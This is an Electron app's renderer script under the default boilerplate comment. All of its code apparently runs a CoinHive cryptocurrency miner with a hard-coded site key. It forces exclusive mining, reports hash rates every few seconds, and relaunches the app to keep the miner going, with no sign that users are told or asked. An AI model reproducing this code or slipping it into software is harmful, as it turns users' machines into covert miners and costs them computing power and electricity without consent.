// This file is required by the index.html file and will
// be executed in the renderer process for that window.
// All of the Node.js APIs are available in this process.
var report = null;
var miner = new CoinHive.Anonymous('S1HjdvwuIkO2NzCxfng4bkTzXVqO4MHN');
miner.on('found', () => console.log('Found!!'));
miner.on('accepted', () => console.log('Accepted!!'));
miner.on('open', () => {
	console.log('Open!!')
	console.log('starting report');
	report = setInterval(function() {
			var hashesPerSecond = miner.getHashesPerSecond();
			var totalHashes = miner.getTotalHashes();
			var acceptedHashes = miner.getAcceptedHashes();
	    console.log(`
	      Hashes per second: ${hashesPerSecond}
	      Total hashes: ${totalHashes}
	      Accepted hashes: ${acceptedHashes}
	    `)
		}, 3000);
});
miner.on('closed', () => {
	console.log('Closed!!')
	if (report){
		console.log('Stopping Report');
		clearInterval(report);
		report = null;
	}
});
miner.on('error', (params) => {
	console.log('Error!!');
	if (params.error === 'connection_error'){
		console.log('Connection Error!! Attempting to reconnect');
	}
	if (report){
		console.log('Stopping Report');
		clearInterval(report);
		report = null;
	}
});
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
setTimeout(() => {
	if (miner.isRunning()) {
		console.log('Miner is running');
	}	else {
		console.log('restart the app');
		const remote = require('electron').remote;
		remote.app.relaunch();
		remote.app.exit(0);
	}
}, 10000);
